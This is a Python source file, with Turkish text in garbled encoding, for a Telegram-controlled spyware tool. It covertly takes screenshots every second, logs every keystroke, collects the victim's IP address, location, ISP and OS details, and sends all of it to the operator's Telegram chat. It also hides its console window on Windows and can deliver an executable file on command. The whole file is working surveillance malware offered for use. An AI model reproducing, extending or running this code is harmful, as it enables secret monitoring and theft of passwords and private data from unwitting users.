import pyautogui
import time
import telebot
import io
import os
import sys
import threading
from pynput.keyboard import Listener
from datetime import datetime
import subprocess
import requests
import platform
from ipwhois import IPWhois
import socket
import nmap  
from urllib.parse import urlparse



BOT_TOKEN = "YOU_BOT_TOKEN"  # @botfather


SCREENSHOT_INTERVAL = 1  


keylog_running = False
keylog_thread = None
keys = []
keylog_send_interval = 60  
listener = None  


bot = telebot.TeleBot(BOT_TOKEN)


running = False  
sending = False  
screenshot_thread = None  
CHAT_ID = None  
screenshot_queue = []  


def send_screenshot():
    """
    Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alÄ±r, bellekte saklar ve Telegram'a gÃ¶nderir.
    """
    global CHAT_ID, sending, screenshot_queue
    if CHAT_ID is None:
        print("CHAT_ID henÃ¼z ayarlanmadÄ±. LÃ¼tfen /start komutunu kullanÄ±n.")
        return

    try:
        
        screenshot = pyautogui.screenshot()

      
        image_stream = io.BytesIO()
        screenshot.save(image_stream, format='PNG')
        image_stream.seek(0) 

       
        if sending:  
            bot.send_photo(chat_id=CHAT_ID, photo=image_stream)
        else:
            screenshot_queue.append(image_stream)  

    except Exception as e:
        print(f"Hata oluÅŸtu: {e}")
        
        bot.send_message(chat_id=CHAT_ID, text=f"Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶nderilirken bir hata oluÅŸtu: {e}")



def screenshot_loop():
    """
    Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alma dÃ¶ngÃ¼sÃ¼. 'running' deÄŸiÅŸkeni True olduÄŸu sÃ¼rece Ã§alÄ±ÅŸÄ±r.
    """
    while running:
        send_screenshot()
        time.sleep(SCREENSHOT_INTERVAL)



def start_screenshotting():
    """
    Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alma iÅŸlemini baÅŸlatÄ±r.
    """
    global running, screenshot_thread, CHAT_ID, sending
    if CHAT_ID is None:
        print("CHAT_ID henÃ¼z ayarlanmadÄ±. LÃ¼tfen /start komutunu kullanÄ±n.")
        return

    if not running:
        running = True
        sending = True  
        screenshot_thread = threading.Thread(target=screenshot_loop)
        screenshot_thread.daemon = True  
        screenshot_thread.start()
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alma baÅŸlatÄ±ldÄ± ve gÃ¶nderiliyor!")
    else:
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alma zaten Ã§alÄ±ÅŸÄ±yor!")



def stop_sending():
    """
    Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶nderme iÅŸlemini durdurur.
    """
    global sending
    if sending:
        sending = False
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶nderme durduruldu! Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alÄ±nmaya devam ediliyor.")
    else:
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶nderme zaten durdurulmuÅŸ!")



def resume_sending():
    """
    Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶nderme iÅŸlemini devam ettirir.
    """
    global sending, screenshot_queue
    if not sending:
        sending = True
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶nderme devam ediyor!")
     
        while screenshot_queue:
            image_stream = screenshot_queue.pop(0)
            bot.send_photo(chat_id=CHAT_ID, photo=image_stream)
    else:
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶nderme zaten devam ediyor!")



def stop_screenshotting():
    """
    Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almayÄ± durdurur.
    """
    global running, screenshot_thread
    if running:
        running = False
        if screenshot_thread:
            screenshot_thread.join(timeout=5)
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alma durduruldu!")
    else:
        bot.send_message(chat_id=CHAT_ID, text="Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alma zaten durdurulmuÅŸ!")



def on_press(key):
    """
    TuÅŸa basÄ±ldÄ±ÄŸÄ±nda yapÄ±lacak iÅŸlemler.
    """
    global keys
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    keys.append((timestamp, key)) 



def write_to_file(keys):
    """
    TuÅŸlarÄ± bir dosyaya yazar ve Telegram'a gÃ¶nderir.
    """
    global CHAT_ID
    if CHAT_ID is None:
        print("CHAT_ID henÃ¼z ayarlanmadÄ±. LÃ¼tfen /start komutunu kullanÄ±n.")
        return

    try:
        with open("keylog.txt", "w", encoding="utf-8") as f:
            for timestamp, key in keys:
                f.write(f"[{timestamp}] {key}\n")  

        with open("keylog.txt", "rb") as f:
            bot.send_document(chat_id=CHAT_ID, document=f)

        os.remove("keylog.txt") 
        keys.clear()  

    except Exception as e:
        print(f"Hata oluÅŸtu: {e}")
        bot.send_message(chat_id=CHAT_ID, text=f"TuÅŸ kaydÄ± gÃ¶nderilirken bir hata oluÅŸtu: {e}")



def keylog_loop():
    """
    TuÅŸ dinleme dÃ¶ngÃ¼sÃ¼.
    """
    global keys, keylog_running, keylog_send_interval, listener
    
    if listener is None:
        listener = Listener(on_press=on_press)
        listener.start()
    while keylog_running:
        time.sleep(keylog_send_interval)
        if keys:  
            write_to_file(keys)



def start_keylogger():
    """
    TuÅŸ kaydediciyi baÅŸlatÄ±r.
    """
    global keylog_running, keylog_thread, listener
    if not keylog_running:
        keylog_running = True
        
        keylog_thread = threading.Thread(target=keylog_loop)
        keylog_thread.daemon = True
        keylog_thread.start()
        bot.send_message(chat_id=CHAT_ID, text="TuÅŸ kaydedici baÅŸlatÄ±ldÄ±!")
    else:
        bot.send_message(chat_id=CHAT_ID, text="TuÅŸ kaydedici zaten Ã§alÄ±ÅŸÄ±yor!")



def stop_keylogger():
    """
    TuÅŸ kaydediciyi durdurur.
    """
    global keylog_running, keylog_thread, listener
    if keylog_running:
        keylog_running = False
        if keylog_thread:
            keylog_thread.join(timeout=5)
        if listener:  
            listener.stop()
            listener = None  
        bot.send_message(chat_id=CHAT_ID, text="TuÅŸ kaydedici durduruldu!")
    else:
        bot.send_message(chat_id=CHAT_ID, text="TuÅŸ kaydedici zaten durdurulmuÅŸ!")



def get_system_info():
    """
    Ä°ÅŸletim sistemi ve donanÄ±m bilgilerini alÄ±r.
    """
    try:
        
        os_info = platform.system() + " " + platform.release()
        try:
            os_version = platform.version()
        except:
            os_version = "SÃ¼rÃ¼m bilgisi alÄ±namadÄ±"

        
        try:
            ip_address = requests.get('https://api.ipify.org').text
           
            location_data = requests.get(f'http://ip-api.com/json/{ip_address}').json()
            city = location_data.get('city', 'Bilinmiyor')
            region = location_data.get('regionName', 'Bilinmiyor')
            country = location_data.get('country', 'Bilinmiyor')
            location = f"{city}, {region}, {country}"
        except Exception as e:
            ip_address = "IP adresi alÄ±namadÄ±."
            location = "Konum bilgisi alÄ±namadÄ±."

       
        try:
            obj = IPWhois(ip_address)
            isp = obj.lookup_rdap()['network']['name']
        except Exception as e:
            isp = "Ä°nternet saÄŸlayÄ±cÄ±sÄ± bulunamadÄ±."

        return os_info, os_version, ip_address, location, isp

    except Exception as e:
        return f"Hata oluÅŸtu: {e}"





@bot.message_handler(commands=['start'])
def send_welcome(message):
    """
    /start komutuna yanÄ±t verir.
    """
    global CHAT_ID
    CHAT_ID = message.chat.id  
    bot.reply_to(message, """                   ð’ð‚ð‘ð„ð„ðð’ð‡ðŽð“

-----------------------------------------------------------------------------------------------------                 
/ss BaÅŸlatÄ±r  

/ssodurdur  ð—˜ð—¸ð—¿ð—®ð—» ð—´ð—¼Ìˆð—¿ð˜‚Ìˆð—»ð˜ð˜‚Ìˆð˜€ð˜‚Ìˆ ð—´ð—¼Ìˆð—»ð—±ð—²ð—¿ð—ºð—²ð˜†ð—¶ ð—±ð˜‚ð—¿ð—±ð˜‚ð—¿ð˜‚ð—¿

/ssdevam ð——ð˜‚ð—¿ð—±ð˜‚ð—¿ð˜‚ð—¹ð—®ð—» ð—²ð—¸ð—¿ð—®ð—» ð—´ð—¼Ìˆð—¿ð˜‚Ìˆð—»ð˜ð˜‚Ìˆð˜€ð˜‚Ìˆ ð—´ð—¼Ìˆð—»ð—±ð—²ð—¿ð—ºð—² ð—¶ð˜€Ì§ð—¹ð—²ð—ºð—¶ð—»ð—² ð—±ð—²ð˜ƒð—®ð—º ð—²ð—±ð—²ð—¿

/ssoff ð—˜ð—¸ð—¿ð—®ð—» ð—´ð—¼Ìˆð—¿ð˜‚Ìˆð—»ð˜ð˜‚Ìˆð˜€ð˜‚Ìˆ ð—®ð—¹ð—ºð—®ð˜†Ä± ð˜ð—®ð—ºð—®ð—ºð—²ð—» ð—±ð˜‚ð—¿ð—±ð˜‚ð—¿ð˜‚ð—¿
-----------------------------------------------------------------------------------------------------
                 
                  ðŠð„ð˜ð‹ðŽð†ð†ð„ð‘
                 
-----------------------------------------------------------------------------------------------------
/keyon ð—•ð—®ð˜€Ì§ð—¹ð—®ð˜Ä±ð—¿ ðŸ­ ð—±ð—®ð—¸ð—¶ð—¸ð—® ð˜€ð—¼ð—»ð—¿ð—® ð—¸ð—®ð˜†ð—±ð—²ð—±ð—¶ð—¹ð—²ð—»ð—¹ð—²ð—¿ð—¶ ð—®ð˜ð—®ð—¿

/keyoff ð—žð—®ð—½ð—®ð˜Ä±ð—¿
-----------------------------------------------------------------------------------------------------
                 
                ð’ðˆÌ‡ð’ð“ð„ðŒ ððˆÌ‡ð‹ð†ðˆÌ‡ð‹ð„ð‘ðˆÌ‡
                 
-----------------------------------------------------------------------------------------------------             
/info ð—¦ð—¶ð˜€ð˜ð—²ð—º ð—¯ð—¶ð—¹ð—´ð—¶ð—¹ð—²ð—¿ð—¶ð—»ð—¶ ð—´ð—¼Ìˆð˜€ð˜ð—²ð—¿ð—¶ð—¿
-----------------------------------------------------------------------------------------------------
                 
                ðð”ð‹ð‹ðˆÌ‡ðð† ð…ðˆÌ‡ð‹ð„
                 
-----------------------------------------------------------------------------------------------------
/pulling ð—¦ð—¶ð˜ð—² ð—¸ð—¼ð—½ð˜†ð—®ð—¹ð—®ð—ºð—® (ð—²ð˜…ð—²) ð—½ð—®ð˜€ð˜€ð˜„ð—¼ð—¿ð—± : ðŸ­ðŸµðŸ¯ðŸ°
-----------------------------------------------------------------------------------------------------     
                           
                   """)
    

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """
    /start komutuna yanÄ±t verir.
    """
    global CHAT_ID
    CHAT_ID = message.chat.id  
    bot.reply_to(message, """       ð·ð¸ð‘‡ð´ð‘Œð¿ð¼ ðµð¼Ì‡ð¿ðºð¼Ì‡
                 

ð’ð‚ð‘ð„ð„ðð’ð‡ðŽð“
                 
-----------------------------------------------------------------------------------------------------                 
  /ss ð—›ð—²ð—¿ ð˜€ð—®ð—»ð—¶ð˜†ð—² ð˜€ð—°ð—¿ð—²ð—²ð—»ð˜€ð—µð—¼ð˜ ð—®ð—¹Ä±ð—¿ ð˜ƒð—² ð˜€ð—¶ð˜‡ð—² ð—®ð˜ð—®ð—¿ 
                 
  /ssdurdur ð—”ð—¹Ä±ð—»ð—®ð—» ð˜€ð—°ð—¿ð—²ð—²ð—»ð˜€ð—µð—¼ð˜'ð—¹ð—®ð—¿Ä± ð˜€ð—¶ð˜‡ð—² ð—®ð˜ð—ºð—®ð˜†Ä± ð—±ð˜‚ð—¿ð—±ð˜‚ð—¿ ð—®ð—ºð—® ð—®ð—¹ð—ºð—®ð˜†ð—® ð—±ð—²ð˜ƒð—®ð—º ð—²ð—±ð—²ð—¿(ð˜€ð—®ð—¸ð—¹ð—®ð—¿)
                 
  /ssdevam ð—¦ð—®ð—¸ð—¹ð—®ð—±Ä± ð˜€ð—°ð—¿ð—²ð—²ð—»ð˜€ð—µð—¼ð˜'ð—¹ð—®ð—¿ ð—µð—²ð—½ð˜€ð—¶ð—»ð—¶ ð˜€ð—¶ð˜‡ð—² ð—®ð˜ð—®ð—¿ ð—®ð˜ð˜Ä±ð—¸ð˜ð—®ð—» ð˜€ð—¼ð—»ð—¿ð—® ð˜€ð—°ð—¿ð—²ð—²ð—»ð˜€ð—µð—¼ð˜ ð—®ð—¹ð—ºð—®ð˜†ð—® ð—±ð—²ð˜ƒð—®ð—º ð—²ð—±ð—²ð—¿
                 
  /ssoff ð—¦ð—°ð—¿ð—²ð—²ð—»ð˜€ð—µð—¼ð˜ ð—®ð—¹ð—ºð—®ð˜†Ä± ð˜ð—®ð—ºð—®ð—ºð—²ð—» ð—±ð˜‚ð—¿ð—±ð˜‚ð—¿ 
----------------------------------------------------------------------------------------------------- 
                                  
ðŠð„ð˜ð‹ðŽð†ð†ð„ð‘
                 
-----------------------------------------------------------------------------------------------------                 
  /keyon ð—•ð—®ð˜€ð˜Ä± ð—µð—²ð—¿ ð˜ð˜‚ð˜€Ì§ð˜‚ ð—¸ð—®ð˜†ð—±ð—²ð—±ð—²ð—¿ ð˜ƒð—² ð—¯ð—®ð˜€ð˜Ä± ð—µð—²ð—¿ ð˜ð˜‚ð˜€Ì§ð˜‚ ð—¬ð—œð—Ÿ,ð—”ð—¬,ð—šð—¨Ìˆð—¡,ð—¦ð—”ð—”ð—§,ð—¦ð—”ð—¡ð—œÌ‡ð—¬ð—˜ ð—¼ð—¹ð—®ð—¿ð—¸ ð—µð—²ð—¿ ðŸ­ ð—±ð—®ð—¸ð—¶ð—¸ð—®ð—±ð—® ð—¯ð—¶ð—¿ ð˜€ð—¶ð˜‡ð—² ð˜ð˜…ð˜ ð—±ð—¼ð˜€ð˜†ð—®ð˜€Ä±ð—»ð—±ð—® ð—®ð˜ð—®ð—¿
                  
  /keyoff Tð˜‚ð˜€Ì§ ð—¸ð—®ð˜†ð—±ð—²ð˜ð—ºð—²ð˜†ð—¶ ð˜ð—®ð—ºð—®ð—ºð—²ð—» ð—±ð˜‚ð—¿ð—±ð˜‚ð—¿
----------------------------------------------------------------------------------------------------- 
                                                 
ð’ðˆÌ‡ð’ð“ð„ðŒ ððˆÌ‡ð‹ð†ðˆÌ‡ð‹ð„ð‘ðˆÌ‡
                 
-----------------------------------------------------------------------------------------------------                   
  /info ð—œÌ‡ð˜€Ì§ð—¹ð—²ð˜ð—¶ð—º ð—¦ð—¶ð˜€ð˜ð—²ð—ºð—¶ð—»ð—¶ 
         ð—œÌ‡ð˜€Ì§ð—¹ð—²ð˜ð—¶ð—º ð—¦ð˜‚Ìˆð—¿ð˜‚Ìˆð—ºð˜‚Ìˆð—»ð˜‚Ìˆ
         ð—œð—½ ð—”ð—±ð—¿ð—²ð˜€ð—¶ð—»ð—¶
         ð—¬ð—®ð˜€Ì§ð—®ð—±Ä± ð—¬ð—²ð—¿ð—¶ (ð—œÌ‡ð—Ÿð—–Ì§ð—˜ , ð—œÌ‡ð—Ÿ , ð—¨Ìˆð—Ÿð—žð—˜)
         ð—œÌ‡ð—»ð˜ð—²ð—¿ð—»ð—²ð˜ ð—¦ð—®ð—´Ì†ð—¹ð—®ð˜†Ä±ð—°Ä±ð˜€Ä± 
                 
         ð•Šð•šð•«ð•– ð•¥ð•©ð•¥ ð••ð• ð•¤ð•ªð•’ð•¤Ä± ð• ð•ð•’ð•£ð•’ð•œ ð•’ð•¥ð•’ð•£
-----------------------------------------------------------------------------------------------------  
                                  
ðð”ð‹ð‹ðˆÌ‡ðð† ð…ðˆÌ‡ð‹ð„
                 
-----------------------------------------------------------------------------------------------------                 
  /pulling ð—˜ð˜…ð—² ð—±ð—¼ð˜€ð˜†ð—®ð˜€Ä±ð—»Ä± ð—®ð—°Ì§ð˜Ä±ð—»Ä±ð˜‡ ð˜‡ð—®ð—ºð—®ð—» ð˜€ð—¶ð˜‡ð—±ð—²ð—» ð˜€Ì§ð—¶ð—³ð—¿ð—² ð—¶ð˜€ð˜ð—¶ð—°ð—²ð—¸ð˜ð—¶ð—¿ (ðŸ­ðŸµðŸ¯ðŸ°) ð—±ð—®ð—µð—® ð˜€ð—¼ð—»ð—¿ð—® ð—¸ð—®ð˜†ð—»ð—®ð—¸ ð—¸ð—¼ð—±ð—¹ð—®ð—¿Ä±ð—»Ä± ð—¶ð—»ð—±ð—¶ð—¿ð—ºð—²ð—¸ ð—¶ð˜€ð˜ð—²ð—±ð—¶ð—»ð—¶ð˜‡ ð˜€ð—¶ð˜ð—²ð—»ð—¶ð—» ð—¨ð—¥ð—Ÿ ð˜€ð—¶ð—»ð—¶ ð—´ð—¶ð—¿ð—¶ð—½ ð—²ð—»ð˜ð—²ð—¿ ð—¯ð—®ð˜€ð˜Ä±ð—»Ä±ð˜‡ ð˜‡ð—®ð—ºð—®ð—» ð—¶ð—»ð—±ð—¶ð—¿ð—ºð—²ð˜†ð—² ð—¯ð—®ð˜€Ì§ð—¹ð—®ð—¿ ð—¶ð—»ð—±ð—¶ð—¿ð—ºð—² ð—¯ð—¶ð˜ð˜ð—¶ ð˜‡ð—®ð—ºð—®ð—» ð—ºð—®ð˜€ð—®ð˜‚Ìˆð˜€ð˜ð˜‚Ìˆð—»ð˜‚Ìˆð˜‡ð—² ð—¸ð—¹ð—®ð˜€ð—¼Ìˆð—¿ ð—¶ð—°Ì§ð—¶ð—»ð—±ð—² ð—¼ð—»ð—¹ð—®ð—¿Ä± ð—¸ð—®ð˜†ð—±ð—²ð—±ð—²ð—¿
            
                  !!! â„ð”¼â„ð•ŠÌ§ð”¼ð•ð•€Ì‡ ð•‹ð”¸ð•„ ð•†ð•ƒð”¸â„ð”¸ð•‚ ð•€Ì‡â„•ð”»ð•€Ì‡â„ð”¼ð•„ð”¼â„¤ !!!
-----------------------------------------------------------------------------------------------------
                                                                                                ð“®ð“¼ð”€ð“»  """)   



@bot.message_handler(commands=['ss'])
def handle_ss_command(message):
    """
    /ss komutuna yanÄ±t verir ve ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almayÄ± baÅŸlatÄ±r.
    """
    start_screenshotting()
    global sending
    sending = True  




@bot.message_handler(commands=['ssoff'])
def handle_ssoff_command(message):
    """
    /ssoff komutuna yanÄ±t verir ve ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶ndermeyi durdurur.
    """
    stop_sending()




@bot.message_handler(commands=['sscontinue'])
def handle_sscontinue_command(message):
    """
    /sscontinue komutuna yanÄ±t verir ve ekran gÃ¶rÃ¼ntÃ¼sÃ¼ gÃ¶ndermeyi devam ettirir.
    """
    resume_sending()




@bot.message_handler(commands=['ssclose'])
def handle_ssclose_command(message):
    """
    /ssclose komutuna yanÄ±t verir ve ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almayÄ± durdurur.
    """
    stop_screenshotting()




@bot.message_handler(commands=['keyon'])
def handle_keyon_command(message):
    """
    /keyon komutuna yanÄ±t verir ve tuÅŸ kaydediciyi baÅŸlatÄ±r.
    """
    start_keylogger()




@bot.message_handler(commands=['keyoff'])
def handle_keyoff_command(message):
    """
    /keyoff komutuna yanÄ±t verir ve tuÅŸ kaydediciyi durdurur.
    """
    stop_keylogger()




@bot.message_handler(commands=['info'])
def handle_info_command(message):
    """
    /info komutuna yanÄ±t verir ve sistem bilgilerini gÃ¶nderir.
    """
    global CHAT_ID
    if CHAT_ID is None:
        print("CHAT_ID henÃ¼z ayarlanmadÄ±. LÃ¼tfen /start komutunu kullanÄ±n.")
        return

    system_info = get_system_info()
    if isinstance(system_info, str):  
        bot.send_message(chat_id=CHAT_ID, text=system_info)
    else:
        os_info, os_version, ip_address, location, isp = system_info
        info_message = f"""
Ä°ÅŸletim Sistemi: {os_info}
Ä°ÅŸletim Sistemi SÃ¼rÃ¼mÃ¼: {os_version}
IP Adresi: {ip_address}
Konum: {location}
Ä°nternet SaÄŸlayÄ±cÄ±sÄ±: {isp}
"""
        bot.send_message(chat_id=CHAT_ID, text=info_message)


EXE_FILE_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pulling_file.exe")

@bot.message_handler(commands=['pulling'])
def handle_go_command(message):
    """
    /go komutuna yanÄ±t verir ve belirlenen exe dosyasÄ±nÄ± gÃ¶nderir.
    """
    global CHAT_ID
    if CHAT_ID is None:
        print("CHAT_ID henÃ¼z ayarlanmadÄ±. LÃ¼tfen /start komutunu kullanÄ±n.")
        return

    try:
        with open(EXE_FILE_PATH, "rb") as exe_file: 
            bot.send_document(chat_id=CHAT_ID, document=exe_file, caption="Ä°ÅŸte istediÄŸiniz dosya!")
    except FileNotFoundError:
        bot.send_message(chat_id=CHAT_ID, text="EXE dosyasÄ± bulunamadÄ±. LÃ¼tfen dosya yolunu kontrol edin.")
    except Exception as e:
        bot.send_message(chat_id=CHAT_ID, text=f"Dosya gÃ¶nderilirken bir hata oluÅŸtu: {e}")



def main():
    """
    Ana fonksiyon. Botu baÅŸlatÄ±r ve olay dÃ¶ngÃ¼sÃ¼nÃ¼ Ã§alÄ±ÅŸtÄ±rÄ±r.
    """
   
    if os.name == "nt":
        import ctypes
        
        def show_console():
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 1)  

       
        def register_hotkey():
            if not ctypes.windll.user32.RegisterHotKey(None, 1, 0x0004 | 0x0008 | 0x0002, 0x53):
                print("Hotkey kaydÄ± baÅŸarÄ±sÄ±z oldu.")
                return False
            return True

        
        def listen_for_hotkey():
            msg = ctypes.wintypes.MSG()
            while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                if msg.message == 0x0100: 
                    if msg.wParam == 0x53 and msg.lParam >> 16 & 0x0001:  
                        show_console()
                ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
                ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

        if register_hotkey():
            
            hotkey_thread = threading.Thread(target=listen_for_hotkey)
            hotkey_thread.daemon = True
            hotkey_thread.start()

            
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  

    
    bot.polling(none_stop=True)



if __name__ == "__main__":
    main()

